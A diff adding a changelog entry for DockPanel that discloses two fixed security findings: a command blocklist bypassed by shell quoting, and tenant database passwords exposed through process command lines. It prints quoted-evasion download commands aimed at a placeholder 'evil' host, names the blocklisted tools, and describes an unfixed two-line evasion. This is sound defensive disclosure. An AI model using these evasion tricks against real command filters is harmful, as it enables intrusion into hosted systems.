@@ -4,6 +4,38 @@ All notable changes to DockPanel will be documented in this file.
 
 The format is based on [Keep a Changelog](https://keepachangelog.com/).
 
+## [2.201.0]
+
+### Security — agent-crate fan-out: 2 findings, both fixed
+
+`dockpanel-fanout`'s first PRIMARY run against `panel/agent/src/{routes,services}`
+(81 files, ~52K LOC — the standing gap named in `feedback_dockpanel_audit_scope`;
+every prior rotation had only ever picked candidates from `panel/backend`). Two
+findings, both confirmed live before shipping.
+
+**Site-terminal / cron command blocklist bypassed by ordinary shell quoting.**
+`command_filter.rs` matched `curl`/`wget`/`su`/`docker`/etc. as a literal substring
+of the raw typed text — but `cu''rl -o /tmp/p http://evil` and `w\get -qO- http://evil`
+contain no such substring, and `bash --restricted --norc --noprofile` (the exact
+invocation the site terminal spawns) removes the quotes/backslash before exec and
+runs the real binary. Reproduced live against that exact invocation before fixing.
+Fixed by normalizing quote/backslash characters out of the command string before
+every blocklist and suspicious-activity check (terminal, cron, and the alerting
+path all shared the same gap). Documented, not fixed here: a deeper class where a
+value assembled across TWO lines in the same persistent shell session (a variable
+set on one line, read on the next) still evades any single-line filter — an
+architectural gap, not a blocklist patch; recorded for a future session.
+
+**Tenant database passwords passed as literal `docker exec`/`docker run` command-line
+arguments** (`-e MYSQL_PWD=...`, `-e PGPASSWORD=...`) across `database.rs` and its
+three backup/restore/verify/drill siblings (25 call sites, 4 files) — `/proc/<pid>/
+cmdline` is world-readable on every install this agent targets, so any local process
+(concretely: a terminal session that just exploited the bypass above) could read
+another tenant's live database password for the lifetime of the docker child. Fixed
+by moving every credential into a fresh 0600 `--env-file` (`DockerEnvFile`, written
+immediately before use, removed on drop) instead of `-e KEY=value` argv — the CLI's
+own argv now carries only a filesystem path, never the secret.
+
 ## [2.200.0]
 
 ### Fixed — migration/staging/oauth fan-out audit: 13 findings, all fixed
